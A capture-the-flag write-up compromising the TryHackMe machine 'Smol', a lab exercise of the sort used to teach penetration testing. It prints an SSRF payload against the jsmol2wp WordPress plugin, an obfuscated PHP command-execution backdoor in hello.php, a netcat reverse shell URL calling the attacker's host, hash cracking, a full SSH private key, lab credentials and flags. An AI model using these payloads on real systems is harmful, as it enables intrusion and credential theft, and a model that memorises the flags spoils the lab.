# Smol

#### **Smol - TryHackMe Write-up**

**Synopsis / Introduction**

This write-up details the process of compromising the TryHackMe machine "Smol". The path to root was a fantastic, multi-layered journey that began with web enumeration and exploitation. I gained an initial foothold by exploiting a Server-Side Request Forgery (SSRF) vulnerability in a WordPress plugin to leak database credentials. This led to discovering a hidden backdoor, which I used to get a reverse shell. From there, I performed post-exploitation enumeration, cracking user password hashes and pivoting between several user accounts by exploiting weak file permissions and discovering an SSH private key. The final step involved finding credentials in an old website backup, which granted me sudo access to become root.

***

#### **Phase 1: Initial Reconnaissance**

**Port Scanning**

As always, my first step was to perform a full port scan to identify all open services on the target machine. I used `rustscan` for its speed, piping the results directly into `nmap` for detailed service enumeration and vulnerability scripting.

**Command:**

```bash
rustscan -a 10.201.7.112 -b 500 -t 5000 -- -A -sC -sV --script=vuln
```

**Output:**

```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Open 10.201.7.112:22
Open 10.201.7.112:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sC -sV --script=vuln" on ip 10.201.7.112

Nmap scan report for 10.201.7.112
Host is up, received syn-ack (0.28s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.2p1: 
|       CVE-2023-38408  9.8     https://vulners.com/cve/CVE-2023-38408
|       CVE-2020-15778  7.8     https://vulners.com/cve/CVE-2020-15778
|_      (Results truncated for brevity)

80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| vulners: 
|   cpe:/a:apache:http_server:2.4.41: 
|       CVE-2023-25690  9.8     https://vulners.com/cve/CVE-2023-25690
|       CVE-2022-31813  9.8     https://vulners.com/cve/CVE-2022-31813
|_      (Results truncated for brevity)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan immediately identified two open ports:

* **Port 22:** Running OpenSSH 8.2p1.
* **Port 80:** Running an Apache 2.4.41 web server.

While the `vulners` script found many potential CVEs, these are often rabbit holes. The web server on port 80 was the most promising attack surface.

**Web Enumeration**

When I ran a follow-up Nmap scan, I noticed a critical piece of information in the output for port 80.

**Command:**

```bash
rustscan -a 10.201.7.112 -b 500 -t 5000 -- -A -sC -sV
```

**Output:**

```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
...
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://www.smol.thm
```

The `http-title` showed a redirect to `http://www.smol.thm`. This indicated that the web server was configured with a virtual host and I needed to use this hostname to access the site properly. I added this to my `/etc/hosts` file.

**Command:**

```bash
sudo nano /etc/hosts
```

**Line Added:**

```bash
10.201.7.112    www.smol.thm
```

With the hostname configured, I ran a final Nmap scan specifically against the web server to confirm the application running.

**Command:**

```bash
sudo nmap -A -sCV -p 22,80 10.201.7.112
```

**Output:**

```bash
Nmap scan report for www.smol.thm (10.201.7.112)
Host is up (0.29s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
...
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 6.7.1
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: AnotherCTF
...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

This confirmed it. The `http-generator` tag revealed the site was running **WordPress 6.7.1**. My next step was clear: enumerate this WordPress installation for vulnerabilities.

***

#### **Phase 2: Gaining a Foothold (Web Exploitation)**

Now that I knew I was dealing with a WordPress site, the next step was to dig deeper and find a vulnerability. I started with general content discovery before moving to a more specialized WordPress scanner.

**Content Discovery**

I first ran `dirsearch` to get a lay of the land and see if there were any interesting files or directories outside the standard WordPress structure.

**Command:**

```bash
dirsearch -u www.smol.thm
```

**Output:**

```bash
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Target: http://www.smol.thm/

[21:23:18] 301 -    0B  - /index.php  ->  http://www.smol.thm/
[21:23:23] 200 -    7KB - /license.txt
[21:23:49] 200 -    3KB - /readme.html
[21:24:19] 301 -  315B  - /wp-admin  ->  http://www.smol.thm/wp-admin/
[21:24:19] 200 -    0B  - /wp-config.php
[21:24:20] 301 -  317B  - /wp-content  ->  http://www.smol.thm/wp-content/
[21:24:21] 301 -  318B  - /wp-includes  ->  http://www.smol.thm/wp-includes/
[21:24:21] 200 -    2KB - /wp-login.php
[21:24:22] 405 -   42B  - /xmlrpc.php
```

The scan confirmed the standard WordPress directories. One finding was particularly strange: `/wp-config.php` returned a `200 OK` status code but with a size of `0B`. This file should never be accessible and suggested a server misconfiguration, though it didn't leak the contents directly via this method.

**WordPress Enumeration with WPScan**

To get more specific information, I used the go-to tool for WordPress scanning, `wpscan`. I enumerated everything, but the most crucial part was the plugin enumeration.

**Command:**

```bash
wpscan --url http://www.smol.thm -e ap
```

**Output:**

```bash
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
_______________________________________________________________

[+] URL: http://www.smol.thm/
[+] Started: Wed Oct  1 18:54:04 2025

Interesting Finding(s):

[+] WordPress version 6.7.1 identified (Outdated, released on 2024-11-21).
...
[+] Upload directory has listing enabled: http://www.smol.thm/wp-content/uploads/
...
[i] Plugin(s) Identified:

[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
```

This scan yielded a critical lead. It identified the plugin **`jsmol2wp` version 1.07**. The name `jsmol` was a strong hint, given the machine's name `smol`. A quick search revealed that this version is vulnerable to an unauthenticated Server-Side Request Forgery (SSRF).

Reference : [https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/](https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/)

**Exploiting SSRF to Leak Credentials**

The SSRF vulnerability allows an attacker to make the server request internal resources. I could use this to finally read the `wp-config.php` file that `dirsearch` found but couldn't display. I crafted the following payload:

**Payload:**

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

Pasting this into my browser's address bar made the server fetch the config file and display its contents.

**Output (Leaked Credentials):**

```php
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );
```

This was my first major breakthrough. I now had a valid username and password for the database.

**Backdoor Discovery**

I immediately tried reusing these credentials to log into the WordPress admin panel. The password `kbLSF2Vop#lw3rjDZ629*Z%G` worked for the user `wpuser`.

<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Once logged into the dashboard, I found a private page titled **"Webmaster Tasks!!"**.

The first item was a massive hint: **"\[IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision."**

Reference : [https://github.com/WordPress/hello-dolly](https://github.com/WordPress/hello-dolly)

This told me exactly where to look next. Instead of relying on the theme editor, I used my SSRF vulnerability again, this time pointing it at the `hello.php` plugin file.

**Command:**

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php
```

**Output (Snippet from `hello.php`):**

```php
// This just echoes the chosen line, we'll position it later.
function hello_dolly() {
	eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
	
	$chosen = hello_dolly_get_lyric();
    // ... rest of the function
```

I had found a hidden, obfuscated backdoor.

**Remote Code Execution**

I decoded the Base64 string to see what the backdoor did.

<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

This revealed the true payload, which used a mix of octal and hex codes: `if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }`.&#x20;

```bash
printf "\143\155\x64"
cmd                                                                                                                                                                                                    
printf "\143\x6d\144"
cmd        
```

This translates to:

```php
if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
```

The backdoor listens for a URL parameter named `cmd` and executes its value. Looking at the plugin's code, the `hello_dolly()` function is hooked into the `admin_notices` action, meaning this code only runs on pages within the `/wp-admin/` directory.

I set up a `netcat` listener and used a URL-encoded reverse shell payload in the browser to trigger the backdoor and gain my initial shell.

**Listener Command:**

```bash
nc -lnvp 4444
```

**Reverse Shell Payload (used in browser URL):**

```
http://www.smol.thm/wp-admin/?cmd=rm %2Ftmp%2Ff%3Bmkfifo %2Ftmp%2Ff%3Bcat %2Ftmp%2Ff|%2Fbin%2Fsh -i 2>%261|nc 10.17.30.9 4444 >%2Ftmp%2Ff
```

**Listener Output:**

```
listening on [any] 4444 ...
connect to [10.17.30.9] from (UNKNOWN) [10.201.87.186] 41746
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

I had successfully gained a foothold on the server as the `www-data` user.

***

#### **Phase 3: User Privilege Escalation**

With a shell as `www-data`, my access was limited. My next goal was to escalate to a standard system user to get a better foothold. The path forward involved digging deeper into the application's resources—specifically, the database.

**Post-Exploitation Enumeration**

First, I stabilized my reverse shell into a fully interactive TTY. This is a crucial quality-of-life step that makes enumeration much easier.

**Command:**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Output:**

```bash
www-data@ip-10-201-87-186:/var/www/wordpress/wp-admin$
```

As the `www-data` user, I had the permissions to interact with the database directly. I already had the credentials for the `wpuser` from the `wp-config.php` file, so I connected to the MySQL service to see what other secrets I could find.

**Command:**

```bash
mysql -h localhost -u wpuser -p
```

I entered the password `kbLSF2Vop#lw3rjDZ629*Z%G` when prompted. Inside the database, I explored the tables, looking for user information.

**Commands (inside MySQL):**

```sql
show databases;
use wordpress;
show tables;
select * from wp_users;
```

The final command, `select * from wp_users;`, was the jackpot. It dumped the entire user table, including their hashed passwords.

**Output:**

```
mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
| ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key | user_status | display_name           |
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
|  1 | admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. | admin         | admin@smol.thm     | http://www.smol.thm | 2023-08-16 06:58:30 |                     |           0 | admin                  |
|  2 | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                     |           0 | wordpress user         |
|  3 | think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ | think         | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                     |           0 | Jose Mario Llado Marti |
|  4 | gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 | gege          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                     |           0 | gege                   |
|  5 | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego         | diego@local        | http://smol.thm     | 2023-08-17 20:19:15 |                     |           0 | diego                  |
|  6 | xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                     |           0 | xavi                   |
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
6 rows in set (0.00 sec)
```

The `$P$` prefix indicated that these were PHPass hashes, which are crackable.

**Password Cracking**

I copied all the hashes into a file named `hashes` on my Kali machine and set `John the Ripper` to work on them using the `rockyou.txt` wordlist.

**Command:**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
```

**Output:**

```bash
Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sandiegocalifornia (?)     
1g 0:00:18:04 11.67% (ETA: 22:47:48) 0.000921g/s 1704p/s 9737c/s 9737C/s dorong..doraemox
Session aborted
```

Success! `John` quickly found a password: `sandiegocalifornia`. By matching it to the hash list, I determined this was the password for the user `diego`.

**Capturing the User Flag**

My next move was to test the principle of password reuse. I attempted to switch from the `www-data` user to the system user `diego` using the password I had just cracked.

**Command:**

```bash
su diego
```

**Output:**

```bash
Password: 
diego@ip-10-201-87-186:/home$
```

It worked. I had successfully escalated my privileges to a standard user account. I immediately checked for the user flag in the home directory.

**Command:**

```bash
cat user.txt
```

**Output:**

```
45edaec653ff9ee06236b7ce72b86963
```

I had captured the user flag. I quickly checked for next stage of escalation with `sudo -l`, but `diego` was not allowed to run any sudo commands. The path to root would require more digging.

***

#### **Phase 4: The Path to Root (Lateral Movement & Enumeration)**

After capturing the user flag as `diego`, the path to root wasn't immediately obvious. The user had no `sudo` privileges, so I needed to perform a much deeper enumeration of the system to find a new attack vector.

**Deep System Enumeration with LinPEAS**

To automate the search for privilege escalation vectors, I uploaded and executed the `linpeas.sh` script. This script is my go-to for checking for a vast range of common misconfigurations, weak permissions, and potential vulnerabilities. After transferring it to the target's `/tmp` directory, I ran it.

**Command:**

```bash
cd /tmp
./linpeas.sh
```

The script produced a massive amount of output, but one section immediately caught my eye, highlighted in red and yellow: **"Analyzing SSH Files"**.

**Output (Critical Snippet from LinPEAS):**

```
╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                                                                         
                                                                                                                                                                                                    
-rwxr-xr-x 1 think think 2602 Jun 21  2023 /home/think/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
══╣ Possible private SSH keys were found!
/home/think/.ssh/id_rsa
```

LinPEAS had found a private SSH key for the user `think` located at `/home/think/.ssh/id_rsa`. More importantly, the permissions on this file were misconfigured, allowing my current user, `diego`, to read it. This was my first pivot point.

**Pivot 1: From `diego` to `think`**

I copied the contents of the `id_rsa` key from my `www-data` shell and saved it to a file named `think_id_rsa` on my local Kali machine. I then set the correct permissions for an SSH key (read/write for owner only) and used it to attempt an SSH login as the `think` user.

**Commands (on Kali):**

```bash
chmod 600 think_id_rsa
ssh -i think_id_rsa think@10.201.87.186
```

**Output:**

```bash
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
...
think@ip-10-201-87-186:~$ id
uid=1000(think) gid=1000(think) groups=1000(think),1004(dev),1005(internal)
```

Success. I had successfully moved laterally from `diego` to `think`, gaining a new shell and new group memberships.

**Pivot 2: From `think` to `gege`**

As the `think` user, I was now part of the `dev` and `internal` groups. This was significant because it meant I might have different permissions than `diego`. I started exploring the `/home` directory again. I noticed that I could list the contents of `/home/gege`.

**Command:**

```bash
ls -la /home/gege
```

**Output:**

```bash
total 31532
drwxr-x--- 2 gege internal     4096 Aug 18  2023 .
drwxr-xr-x 8 root root         4096 Oct  1 11:09 ..
...
-rwxr-x--- 1 root gege     32266546 Aug 16  2023 wordpress.old.zip
```

Inside `gege`'s home directory was a large file named `wordpress.old.zip`. This backup file was my next major clue.

Before dealing with the file, I checked for a simple misconfiguration. Since I was in a shared group, I tried to switch users to `gege` to see if a password was even required.

**Command:**

```bash
su gege
```

**Output:**

```bash
gege@ip-10-201-87-186:/tmp$ id
uid=1003(gege) gid=1003(gege) groups=1003(gege),1004(dev),1005(internal)
```

Amazingly, it worked without a password. I had pivoted again, this time from `think` to `gege`. Now, as `gege`, I had full permissions to interact with the `wordpress.old.zip` file.

**The Final Clue: A Protected Backup**

As `gege`, I attempted to unzip the backup file.

**Command:**

```bash
unzip wordpress.old.zip
```

**Output:**

```bash
Archive:  wordpress.old.zip
[wordpress.old.zip] wordpress.old/wp-config.php password: 
```

The archive was password-protected. This discovery was pivotal. It was highly likely that the password for this backup was the actual login password for the user `gege`. To crack it, I needed to get the file onto my local machine for an offline attack. I started a quick Python web server as `gege` to transfer the file.

***

#### **Phase 5: Cracking the Final Password and Root Compromise**

**Cracking the ZIP Password**

After downloading `wordpress.old.zip` to my Kali machine, I used the `zip2john` utility to extract the hash and then used `john` to crack it.

**Commands (on Kali):**

```bash
zip2john wordpress.old.zip > zipfile
john zipfile --wordlist=/usr/share/wordlists/rockyou.txt
```

**Output:**

```bash
Loaded 1 password hash (PKZIP [32/64])
...
hero_gege@hotmail.com (wordpress.old.zip)     
1g 0:00:00:00 DONE...
Session completed. 
```

The password for the zip file was `hero_gege@hotmail.com`.

**Uncovering the Root Credential**

With the password, I unzipped the archive on my local machine to inspect the contents. Inside, I found another `wp-config.php` file, this one from the old backup.

**Command (on Kali):**

```bash
unzip wordpress.old.zip
cat wordpress.old/wp-config.php
```

**Output:**

```php
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'xavi' );

/** Database password */
define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );
```

This was the final piece of the puzzle. The old backup contained credentials for a different user, `xavi`, with the password `P@ssw0rdxavi@`. I theorized this password had been reused for `xavi`'s system account.

**Sudo to Root**

I went back to my shell on the target machine and switched to the `xavi` user with the newly discovered password.

**Command:**

```bash
su xavi
# Enter password: P@ssw0rdxavi@
```

The password worked. As my final check, I listed `xavi`'s sudo privileges.

**Command:**

```bash
sudo -l
```

**Output:**

```bash
Matching Defaults entries for xavi on ip-10-201-87-186:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on ip-10-201-87-186:
    (ALL : ALL) ALL
```

The output `(ALL : ALL) ALL` confirmed that `xavi` had full sudo privileges.

**Capturing the Root Flag**

The final step was to use these privileges to become root and read the flag.

**Command:**

```bash
sudo su
cd /root
cat root.txt
```

**Output:**

```bash
root@ip-10-201-87-186:~# cat root.txt 
bf89ea3ea01992353aef1f576214d4e4
```

And with that, the machine was rooted.\
Thankyou for reading ☺️.
